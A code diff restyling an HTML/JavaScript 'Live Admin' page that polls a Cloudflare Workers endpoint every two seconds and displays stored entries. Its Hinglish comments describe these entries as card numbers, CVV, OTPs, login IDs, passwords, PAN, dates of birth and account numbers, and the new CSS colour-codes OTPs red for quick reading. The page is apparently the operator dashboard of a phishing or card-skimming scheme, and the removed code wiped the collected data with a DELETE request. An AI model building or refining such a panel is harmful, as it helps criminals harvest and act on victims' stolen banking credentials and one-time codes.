@@ -3,86 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>B&W Dashboard</title>
+    <title>Live Admin</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         
-        body { background-color: #000; color: #fff; padding-bottom: 80px; }
+        /* White Background */
+        body { background-color: #ffffff; color: #333; padding-bottom: 20px; }
 
-        /* Header */
+        /* Header: Clean Blue/Grey */
         .header {
-            background: #000;
-            padding: 20px;
+            background: #f8f9fa;
+            padding: 15px 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 2px solid #222;
+            border-bottom: 1px solid #eee;
             position: sticky;
             top: 0;
             z-index: 1000;
         }
-        .header h1 { font-size: 14px; letter-spacing: 3px; color: #666; text-transform: uppercase; }
+        .header h1 { font-size: 15px; color: #666; text-transform: uppercase; letter-spacing: 1px; }
         
-        /* Visit Count Badge */
+        /* Count Badge */
         .v-badge {
-            background: #fff;
-            color: #000;
-            padding: 5px 20px;
-            border-radius: 2px;
-            font-weight: 900;
-            font-size: 24px;
-        }
-
-        .container { padding: 15px; display: flex; flex-direction: column; gap: 12px; }
-
-        /* Data Row (Card, OTP, Login sab ke liye) */
-        .data-row {
             background: #000;
-            padding: 20px;
-            border: 1px solid #333;
-            border-left: 6px solid #fff; 
-            font-size: 18px;
-            font-weight: 800;
             color: #fff;
-            white-space: pre-wrap; /* \n ko support karta hai */
-            line-height: 1.8; 
+            padding: 2px 12px;
+            border-radius: 15px;
+            font-weight: 700;
+            font-size: 16px;
+        }
+
+        .container { 
+            padding: 10px; 
+            display: flex; 
+            flex-direction: column; 
+            gap: 10px; 
+        }
+
+        /* Card Style */
+        .data-row {
+            background: #ffffff;
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #f0f0f0;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.03);
+            font-size: 17px;
+            font-weight: 700;
+            line-height: 1.6;
+            white-space: pre-wrap;
             word-break: break-all;
-            animation: slideIn 0.3s ease-out;
         }
 
-        @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
+        /* --- COLOR CODING LOGIC --- */
+        
+        /* Green for User, Pass, Pan, Dob, Acc */
+        .text-green { color: #28a745 !important; }
+        
+        /* Red for OTP */
+        .text-red { color: #dc3545 !important; }
 
-        /* Delete Button */
-        .btn-clear {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
-            background: #ff0000;
-            color: #fff;
-            border: none;
-            padding: 10px 20px;
-            font-weight: 900;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 12px;
-            box-shadow: 0 0 10px rgba(255,0,0,0.4);
+        .time-stamp {
+            display: block;
+            font-size: 10px;
+            color: #ccc;
+            margin-top: 8px;
+            font-weight: 400;
         }
-
-        .sync { text-align: center; font-size: 9px; color: #333; margin-top: 30px; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <h1>Live Activity</h1>
+        <h1>Live Feed</h1>
         <div class="v-badge" id="vCount">0</div>
     </div>
 
     <div class="container" id="logsDisplay">
         </div>
-
-    <button class="btn-clear" onclick="clearData()">CLEAR ALL</button>
-    <div class="sync">D1 CONNECTED • AUTO-REFRESH 2S</div>
 
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
@@ -101,34 +99,32 @@
                 lastHash = currentHash;
 
                 if (!data) return;
-
-                // Update Total Count
                 badge.innerText = data.length;
 
-                // Filter and Render
-                let htmlContent = data.map(log => {
-                    // VISIT data ko hide rakho, baki sab dikhao
+                // Render logic
+                display.innerHTML = data.map(log => {
                     if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) {
                         return ""; 
                     }
 
-                    // Card, CVV, ID, Pass sab isme line-by-line dikhenge
-                    return `<div class="data-row">${log.detail}</div>`;
+                    // Color selection based on content
+                    let colorClass = "text-green"; // Default Green
+                    if (log.detail.includes("Otp:-")) {
+                        colorClass = "text-red"; // Red for OTP
+                    }
+
+                    return `
+                        <div class="data-row ${colorClass}">
+                            ${log.detail}
+                            <span class="time-stamp">${log.time || ''}</span>
+                        </div>
+                    `;
                 }).join('');
 
-                display.innerHTML = htmlContent;
-
-            } catch (e) { console.log("Reconnecting..."); }
+            } catch (e) { console.log("Syncing..."); }
         }
 
-        // Database saaf karne ka function
-        async function clearData() {
-            if(confirm("Bhai, saara data uda dein?")) {
-                await fetch(workerURL, { method: 'DELETE' });
-                location.reload();
-            }
-        }
-
+        // Auto update every 2 seconds
         setInterval(refresh, 2000);
         window.onload = refresh;
     </script>
